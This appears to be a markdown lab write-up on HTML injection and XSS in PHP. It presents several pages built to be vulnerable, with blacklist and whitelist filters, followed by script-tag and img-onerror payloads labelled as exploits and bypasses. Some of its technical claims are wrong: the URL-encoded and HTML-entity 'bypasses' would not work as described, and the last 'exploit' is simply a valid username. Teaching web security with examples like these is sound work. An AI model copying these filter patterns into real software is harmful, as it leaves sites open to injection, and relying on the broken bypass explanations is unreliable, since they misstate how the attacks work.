
# ğŸ”´ HTML Injection â€” Blacklist (GET & POST)
---

## ğŸš« Blacklist-Based Filtering (GET Method)

```php
html-injection-black-list-get.php
```
```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML Injection Blacklist - GET</title>
</head>
<body>
    <h1>HTML Injection Blacklist - GET</h1>
    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = preg_replace("/<|>/", "", $_REQUEST['user']); // Removes < and >
        echo "<h2>" . $user_name . "!!</h2>";
    }
    ?>
</body>
</html>
```

### ğŸ’¥ Exploit:

```url
http://example.com/html-injection-black-list-get.php?user=<h1>XSS</h1>
```

### ğŸ› ï¸ Bypass Technique:

Use encoded payload:

```
<script>alert('XSS')</script>  
â†’ Encoded as: %3Cscript%3Ealert('XSS')%3C/script%3E
```

> âš ï¸ **Weak blacklist** â€” only removes `<` and `>`, but many other dangerous inputs like quotes, event handlers, or `img` tags can still execute malicious code.

---

## ğŸš« Blacklist-Based Filtering (POST Method)
```php
html-injection-black-list-post.php
```
```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML Injection Blacklist - POST</title>
</head>
<body>
    <h1>HTML Injection Blacklist - POST</h1>
    <form action="html-injection-black-list-post.php" method="POST">
        User Name: <input type="text" name="user"><br>
        <input type="submit" value="Login">
    </form>

    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = preg_replace("/<|>/", "", $_REQUEST['user']);
        echo "<h2>" . $user_name . "!!</h2>";
    }
    ?>
</body>
</html>
```

### ğŸ’¥ Exploit:

```php
<h1>Hello!</h1>
```
```php  
<img src=x onerror=alert('XSS')>
```

### ğŸ› ï¸ Bypass Technique:

> Use HTML entities:

```php
&lt;img src=x onerror=alert(1)&gt;
```

> âš ï¸ **Encoding evasion** â€” Blacklists are easy to bypass using encoded characters or alternative syntax.

---

# ğŸ”´ HTML Injection â€” Whitelist 

> âš ï¸ Weak Whitelist Example â€” Still Vulnerable
```php
html-injection-white-list.php
```
```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>HTML Injection Whitelist</title>
</head>
<body>
    <h1>HTML Injection Whitelist</h1>
    <form action="html-injection-white-list.php" method="POST">
        User Name: <input type="text" name="user"><br />
        <input type="submit" value="Login">
    </form>

    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = $_REQUEST['user'];
        if (!preg_match('/[a-z\d_\-\.]/i', $user_name)) {
            die("Don't try to Inject Code");
        } else {
            echo "<h2>" . $user_name . "!!</h2>";
        }
    }
    ?>
</body>
</html>
```

### ğŸ’¥ Exploit:

```php
<h1>Injected</h1>
```

> âœ… Passes because characters like `h`, `1`, `I`, etc., are in the allowed set.

### ğŸ› ï¸ Bypass Technique:

```php
a<script>alert(1)</script>
```

> âš ï¸ The regex only *checks if input contains* allowed characters â€” it doesnâ€™t reject bad ones **outside** the list.

---

## ğŸ”¥ `html-injection-white-list2.php` â€” Completely Vulnerable
```php
html-injection-white-list2.php
```
```php
<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <title>Html Injection White List - 2</title>
</head>
<body>
    <h1>Html Injection White List - 2</h1>
    <form action="html-injection-white-list2.php" method="POST">
        User Name: <input type="text" name="user"><br />
        <input type="submit" value="login">
    </form>

    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = $_REQUEST['user'];

        // âŒ Weak Regex: Only checks if ONE allowed char is present
        if (preg_match('/[a-z\d_\.\-]/i', $user_name)) {
            echo '<h2>' . $user_name . '!</h2>'; // No sanitization
        } else {
            die("Don't try to Inject Code");
        }
    }
    ?>
</body>
</html>
```

### ğŸ’¥ Exploit:

```php
a<script>alert('XSS')</script>
```

> âš ï¸ Only one matching character (e.g., `a`) is enough for input to be accepted. Full injection follows.

---

## ğŸ›¡ï¸ `html-injection-white-list3.php` â€” Improved, But Still Risky
```php
html-injection-white-list3.php
```

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <title>Html Injection White List - 3</title>
</head>
<body>
    <h1>Html Injection White List - 3</h1>
    <form action="html-injection-white-list3.php" method="POST">
        User Name: <input type="text" name="user"><br />
        <input type="submit" value="login">
    </form>

    <?php
    if (isset($_REQUEST['user'])) {
        $user_name = $_REQUEST['user'];

        // Strict Regex: Matches only full valid string
        if (!preg_match('/^[a-z\d\.\-\_]*$/i', $user_name)) {
            die("Don't try to Inject Code");
        } else {
            echo "<h2>" . $user_name . "!</h2>";
        }
    }
    ?>
</body>
</html>
```

### ğŸ’¥ Exploit:

```php
admin_user-12
```

